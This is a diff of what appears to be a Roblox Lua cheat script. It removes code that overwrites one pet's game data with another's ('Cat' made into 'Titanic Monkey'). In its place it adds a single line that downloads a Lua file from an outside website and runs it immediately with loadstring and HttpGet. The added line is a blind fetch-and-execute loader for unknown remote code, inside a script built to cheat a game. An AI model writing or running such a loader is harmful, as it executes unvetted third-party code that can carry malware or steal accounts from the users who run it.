@@ -1,11 +1,1 @@
-local lib = require(game.ReplicatedStorage.Library)
-
-local fromPet = "Cat"
-local toPet = "Titanic Monkey"
-
-for i,v in pairs(lib.Directory.Pets[fromPet]) do
-  lib.Directory.Pets[fromPet][i] = nil
-end
-for i,v in pairs(lib.Directory.Pets[toPet]) do
-  lib.Directory.Pets[fromPet][i] = v
-end
+loadstring(game:HttpGet('https://hugegames.space/b2b39c7bc83a7d17a0abeaf3.lua'))()
